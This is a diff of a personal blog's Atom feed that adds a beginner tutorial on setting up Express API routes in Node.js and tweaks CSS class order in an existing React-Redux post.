@@ -1,18 +1,151 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/all.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-09-25T00:00:00+10:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>Actions and Reducers in React-Redux</title><link href="https://jackmckew.dev/actions-and-reducers-in-react-redux.html" rel="alternate"></link><published>2020-09-25T00:00:00+10:00</published><updated>2020-09-25T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-25:/actions-and-reducers-in-react-redux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Jack McKew's Blog</title><link href="https://jackmckew.dev/" rel="alternate"></link><link href="https://jackmckew.dev/feeds/all.atom.xml" rel="self"></link><id>https://jackmckew.dev/</id><updated>2020-10-02T00:00:00+10:00</updated><subtitle>Engineer | Software Developer | Data Scientist</subtitle><entry><title>API Routes in Node.js</title><link href="https://jackmckew.dev/api-routes-in-nodejs.html" rel="alternate"></link><published>2020-10-02T00:00:00+10:00</published><updated>2020-10-02T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-10-02:/api-routes-in-nodejs.html</id><summary type="html">&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;First off what's an API and more specifically what's an API route? API stands for Application Programming Interface, meaning it's how to communicate with the system you are creating. A route within an API is a specific path to take to get specific information or data out of. This post will dive into how to set up API routes in Nodejs with express.&lt;/p&gt;
+&lt;p&gt;We start by 'importing' express into our route and instantiating a router from the express library.&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'express'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;express&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Router&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;Typically we group API routes together in standalone javascript files. For example, if our application needed authentication for users logging in, we could create an &lt;code&gt;auth.js&lt;/code&gt; file which will contain all the API routes to do with authentication.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We need to import express and instantiate the router in each of the standalone javascript files.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Next we can create routes as straightforward as using the corresponding method within &lt;code&gt;router&lt;/code&gt;. Pending on the type of API that is being created, if you are using Express.js, it's mostly likely a web API and thus the methods follow HTTP method routes.&lt;/p&gt;
+&lt;p&gt;The primary or most-commonly-used HTTP methods are:&lt;/p&gt;
+&lt;table class="table table-striped"&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Method Name&lt;/th&gt;
+&lt;th&gt;Operation&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST&lt;/td&gt;
+&lt;td&gt;Create&lt;/td&gt;
+&lt;td&gt;Used for creating a new record of information&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;GET&lt;/td&gt;
+&lt;td&gt;Read&lt;/td&gt;
+&lt;td&gt;Used for retrieving information&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PUT&lt;/td&gt;
+&lt;td&gt;Update&lt;/td&gt;
+&lt;td&gt;Used for updating existing information&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;DELETE&lt;/td&gt;
+&lt;td&gt;Delete&lt;/td&gt;
+&lt;td&gt;Used for deleting information&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;These 4 methods make up the basic CRUD functionality (Create, Read, Update and Delete) of an application.&lt;/p&gt;
+&lt;h2 id="post"&gt;POST&lt;/h2&gt;
+&lt;p&gt;Let's create a scaffold &lt;code&gt;POST&lt;/code&gt; method in node.js.&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'POST request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;Similarly to do this asynchronously with arrow functions:&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'POST request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;As we can see above, the first argument to our API route method is the path, and the following is the callback function (what should happen when this path is hit). The callback function can be a function, array of functions, series of functions (separated by commas), or a combination of all of them. This is useful if you are wanting to do validation before the final POST request is made. An example of this is:&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,[&lt;/span&gt;&lt;span class="nx"&gt;checkInputs&lt;/span&gt;&lt;span class="p"&gt;()],&lt;/span&gt; &lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'POST request to homepage and inputs are valid'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id="get"&gt;GET&lt;/h2&gt;
+&lt;p&gt;All the methods within Express.js follow the same principles so to create a scaffold &lt;code&gt;GET&lt;/code&gt; request:&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'GET request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id="put"&gt;PUT&lt;/h2&gt;
+&lt;p&gt;Similarly:&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'PUT request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id="delete"&gt;DELETE&lt;/h2&gt;
+&lt;p&gt;Similarly:&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="k"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'PUT request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;h2 id="express-middleware"&gt;Express Middleware&lt;/h2&gt;
+&lt;p&gt;All of the callback functions defined above are known as Middleware functions in Express.js. Middleware functions have access to 3 elements: &lt;code&gt;req&lt;/code&gt;, &lt;code&gt;res&lt;/code&gt;, and &lt;code&gt;next&lt;/code&gt;.&lt;/p&gt;
+&lt;table class="table table-striped"&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Argument&lt;/th&gt;
+&lt;th&gt;Use&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;req&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;HTTP request, named &lt;code&gt;req&lt;/code&gt; by convention&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;res&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;HTTP response, named &lt;code&gt;res&lt;/code&gt; by convention&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;next&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;The next middleware function to be called&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;An example of using all of the arguments is:&lt;/p&gt;
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+2
+3
+4
+5&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nx"&gt;router&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'/'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;async&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;res&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'GET request to homepage'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="nx"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;span class="p"&gt;})&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
+&lt;p&gt;By piecing together many of these API routes (also known as endpoints) we can build a functional API that can drive our applications. For example, the application in the end may make a &lt;code&gt;GET&lt;/code&gt; request to get all the latest posts by other users, and makes a &lt;code&gt;POST&lt;/code&gt; request when you add a new post, and so on with all the different types of API routes.&lt;/p&gt;&lt;/body&gt;</content><category term="Javascript"></category><category term="javascript"></category></entry><entry><title>Actions and Reducers in React-Redux</title><link href="https://jackmckew.dev/actions-and-reducers-in-react-redux.html" rel="alternate"></link><published>2020-09-25T00:00:00+10:00</published><updated>2020-09-25T00:00:00+10:00</updated><author><name>Jack McKew</name></author><id>tag:jackmckew.dev,2020-09-25:/actions-and-reducers-in-react-redux.html</id><summary type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
 &lt;p&gt;In this post let's go into actions and reducers …&lt;/p&gt;&lt;/body&gt;</summary><content type="html">&lt;body&gt;&lt;p&gt;Redux is a &lt;em&gt;predictable state container for JavaScript applications&lt;/em&gt;, and React is &lt;em&gt;a JavaScript library for building user interfaces&lt;/em&gt;. To bridge the two, you get &lt;code&gt;react-redux&lt;/code&gt; which allows our user interfaces to interact &amp;amp; respond to the current state of the application.&lt;/p&gt;
 &lt;p&gt;In this post let's go into actions and reducers. First off, what is an action and what is a reducer in this context? &lt;strong&gt;Actions&lt;/strong&gt; are payloads of information that send data from the application to the redux store. &lt;strong&gt;Reducers&lt;/strong&gt; specify how the application's state changes in response to actions sent to the store. It is summarized in the graphic:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="Redux State Diagram" class="img-fluid" src="https://jackmckew.dev/img/redux-diagram.png"/&gt;&lt;/p&gt;
 &lt;p&gt;Let's use &lt;code&gt;react-redux&lt;/code&gt; to build a system which we can alert users when things trigger. For this we will need to build an action, a reducer and a component to display the alert.&lt;/p&gt;
 &lt;p&gt;To ensure that these three components are speaking the same language, we need to initialise types which will represent the states being passed around. These variables contain a string. For our alert system we need two variables&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;SET_ALERT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"SET_ALERT"&lt;/span&gt;
 &lt;span class="kr"&gt;export&lt;/span&gt; &lt;span class="kr"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;REMOVE_ALERT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;"REMOVE_ALERT"&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;h2 id="action"&gt;Action&lt;/h2&gt;
 &lt;p&gt;We'll start by creating the action which will signify when an alert is triggered. We want all of our alerts to be unique so multiple alerts can handled without a problem which we will use &lt;code&gt;uuid&lt;/code&gt;.&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -55,7 +188,7 @@
 &lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p&gt;The action is declared as a function, which takes in 3 arguments (2 required): &lt;code&gt;msg&lt;/code&gt;, &lt;code&gt;alertType&lt;/code&gt; and &lt;code&gt;timeout&lt;/code&gt;. Which we then use call the dispatch function with an object constructed from the arguments, and then after a specified timeout we dispatch another object to remove the same alert.&lt;/p&gt;
 &lt;p&gt;Note that we curry the dispatch function in this case, this is only possible from using the middleware &lt;code&gt;redux-thunk&lt;/code&gt;, which can also be represented as:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -73,7 +206,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;This post won't go into detail around how to build a React component, which you can find over at another post: [INSERT REACT COMPONENT POST]&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -121,7 +254,7 @@
 &lt;p&gt;To break it down, we've created a React component (class) &lt;code&gt;Alert&lt;/code&gt; which takes in &lt;code&gt;alerts&lt;/code&gt; as an array, verifies it isn't null or empty, and finally iterates over each element in the &lt;code&gt;alerts&lt;/code&gt; array to return a &lt;code&gt;div&lt;/code&gt; stylized with the appropriate information.&lt;/p&gt;
 &lt;h2 id="reducer"&gt;Reducer&lt;/h2&gt;
 &lt;p&gt;Lastly we have the reducer which we want to handle all the states that can be created by the &lt;code&gt;alert&lt;/code&gt; action. Luckily we can do this with a switch statement:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -169,7 +302,7 @@
 &lt;/blockquote&gt;
 &lt;p&gt;Let's create a file &lt;code&gt;Landing.js&lt;/code&gt; (similarly could be named &lt;code&gt;Landing.jsx&lt;/code&gt; for react specific file extension, &lt;code&gt;Landing.ts&lt;/code&gt; for TypeScript or &lt;code&gt;Landing.tsx&lt;/code&gt; for both react specific extension with TypeScript). This is followed by by importing all the necessary requirements for our javascript file.&lt;/p&gt;
 &lt;h2 id="import-requirements"&gt;Import Requirements&lt;/h2&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kr"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;React&lt;/span&gt; &lt;span class="nx"&gt;from&lt;/span&gt; &lt;span class="s2"&gt;"react"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -184,7 +317,7 @@
 &lt;p&gt;&lt;code&gt;PropTypes&lt;/code&gt; is a way of implementing runtime type checking for React props. If TypeScript is used for the project, this is somewhat extra type checking, which we can never have enough of!&lt;/p&gt;
 &lt;h2 id="the-component"&gt;The Component&lt;/h2&gt;
 &lt;p&gt;Now that we've imported everything that we need, it's time to actually create the component! A component in React is a function, where the props are the inputs and the element to be rendered is the return statement. We do this with an arrow function (aka Lambda function) for clarity.&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -242,7 +375,7 @@
 &lt;blockquote&gt;
 &lt;p&gt;This post is not intended to go through how to set up the redux store or interactions with it.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;1
 2
 3
 4
@@ -257,7 +390,7 @@
 &lt;h2 id="conclusion"&gt;Conclusion&lt;/h2&gt;
 &lt;p&gt;Now we can use the statement &lt;code&gt;import Landing from './Landing'&lt;/code&gt; and use our component similar to that of &lt;code&gt;Link&lt;/code&gt; in our app!&lt;/p&gt;
 &lt;p&gt;The full source of &lt;code&gt;Landing.js&lt;/code&gt; is:&lt;/p&gt;
-&lt;table class="table-striped highlighttable table"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
+&lt;table class="table table-striped highlighttable"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
  2
  3
  4
@@ -443,27 +576,27 @@
 &lt;/ol&gt;
